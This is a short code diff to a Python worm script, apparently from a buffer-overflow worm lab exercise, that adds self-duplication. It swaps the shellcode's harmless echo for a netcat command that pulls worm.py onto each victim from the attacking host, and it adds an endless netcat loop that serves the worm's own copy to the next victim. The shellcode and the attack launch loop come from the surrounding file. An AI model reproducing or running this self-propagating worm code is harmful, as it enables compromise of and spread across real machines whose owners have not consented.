@@ -5,6 +5,10 @@ import time
 import subprocess
 from random import randint
 
+# Task 3
+# This host's own IP - the victim pulls worm.py from here
+myIP = subprocess.check_output("hostname -I", shell=True).decode().split()[0]
+
 # You can use this shellcode to run any command you want
 shellcode= (
    "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
@@ -18,7 +22,7 @@ shellcode= (
    # Separating the commands using semicolons.
    # Make sure you don't change the length of each line. 
    # The * in the 3rd line will be replaced by a binary zero.
-   " echo '(^_^) Shellcode is running (^_^)';                   "
+   "nc -w5 10.151.0.1 7070 > worm.py;                           "
    "                                                            "
    "                                                           *"
    "123456789012345678901234567890123456789012345678901234567890"
@@ -62,6 +66,10 @@ subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)
 
 # Create the badfile 
 createBadfile()
+
+# Task 3: self-duplication
+# Serve this worm's own copy to the next victim 
+subprocess.Popen(["while true; do nc -lnv 7070 -q1 < worm.py; done"], shell=True)
 
 # Launch the attack on other servers
 while True:
